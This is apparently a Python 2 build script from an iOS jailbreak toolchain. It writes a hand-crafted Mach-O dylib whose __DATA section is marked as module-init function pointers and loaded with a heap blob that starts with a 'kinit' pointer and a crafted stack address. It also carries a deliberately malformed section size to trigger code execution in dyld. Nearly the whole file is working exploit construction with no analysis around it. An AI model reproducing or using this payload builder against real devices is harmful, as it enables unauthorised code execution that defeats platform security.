#!/opt/local/bin/python2.6
import struct, sys, os
import warnings
warnings.simplefilter('error')

import config
cfg = config.openconfig()
arch = cfg['arch']
assert arch in ['armv6', 'armv7', 'i386']

beforesize = 0x8000
heapaddr = 0x11000000
baseaddr = heapaddr - beforesize

dontcare = 0

if len(sys.argv) <= 1:
    print 'Usage: one.py <heapfile>'
    sys.exit(1)

# heap: [init function that is actually kinit] R6 R9 R12 SP [PC provided by goo] [the rest...]
heap = struct.pack('IIIII', cfg['#cache']['kinit'], 0, 0, 0, heapaddr + 20 + 4)
heap += open(sys.argv[1], 'rb').read()

heapsize = len(heap)
heapoff = 0x1000

fp = open('one.dylib', 'wb')
OFF = 0
def f(x):
    global OFF
    if isinstance(x, basestring):
        fp.write(x)
        OFF += len(x)
    else:
        fp.write(struct.pack('I', x))
        OFF += 4

lc_size = 0x7c + 0x50 + 0x18 # size of load commands

f(0xfeedface) # magic
if arch == 'armv6':
    f(12) # CPU_TYPE_ARM
    f(6) # CPU_SUBTYPE_ARM_V6
elif arch == 'armv7':
    f(12) # CPU_TYPE_ARM
    f(9) # CPU_SUBTYPE_ARM_V7
elif arch == 'i386':
    f(7)
    f(3)
f(6) # MH_DYLIB
f(4) # number of load commands
f(123) # overwrite this
# flags: MH_FORCE_FLAT | MH_DYLDLINK | MH_PREBOUND
f(0x100 | 0x4 | 0x10)

# Load commands
# LC_SEGMENT
f(1) 
f(56 + 1*68)
f('__LINKEDIT' + '\0'*6)
f(baseaddr) # vmaddr
f(beforesize) # vmsize
f(0) # fileoff
f(0) # filesize
f(3) # maxprot = VM_PROT_READ | VM_PROT_WRITE
f(3) # initprot = VM_PROT_READ | VM_PROT_WRITE
f(1) # 1 section
f(0) # flags=0

# Section 1
f('__text' + '\0'*10)
f('__LINKEDIT' + '\0'*6)
f(baseaddr) # address
f(beforesize) # size
f(0) # off
f(0) # align
f(0) # reloff
f(0) # nreloc
f(0) # flags 
f(0) # reserved1
f(0) # reserved2

# LC_SEGMENT
f(1) 
f(56 + 1*68)
f('__DATA' + '\0'*10)
f(heapaddr) # vmaddr
f(heapsize) # vmsize
f(heapoff) # fileoff
f(heapsize) # filesize
f(3) # maxprot = VM_PROT_READ | VM_PROT_WRITE
f(3) # initprot = VM_PROT_READ | VM_PROT_WRITE
f(1) # 1 section
f(0) # flags=0

# Section 1 - dyld crashes without this
f('__heap' + '\0'*10)
f('__DATA' + '\0'*10)
f(heapaddr) # address
# HACK for armv6 kinit
f(heapaddr << 2) # size
f(heapoff) # off
f(0) # align
f(0) # reloff
f(0) # nreloc
f(9) # flags = S_MOD_INIT_FUNC_POINTERS
f(0) # reserved1
f(0) # reserved2

# dyld crashes without this
f(0xb) # LC_DYSYMTAB
f(0x50)
f(0); f(0) # local
f(0); f(0) # extdef
f(0); f(0) # undef
f(0); f(0) # toc
f(0); f(0) # modtab
f(0); f(0) # extrefsym
f(0); f(0) # indirectsym
f(0); f(0) # extrel
f(0); f(0) # locrel

# this too
f(2) # LC_SYMTAB
f(4*6)
f(0) # symoff
f(0) # nsyms
f(0) # stroff
f(0) # strsize

fp.seek(0x14)
fp.write(struct.pack('I', OFF - 0x1c))
fp.seek(OFF)


# segments starting at odd offsets are not allowed.
fp.seek(0x1000)
heapoff = fp.tell()
fp.write(heap)
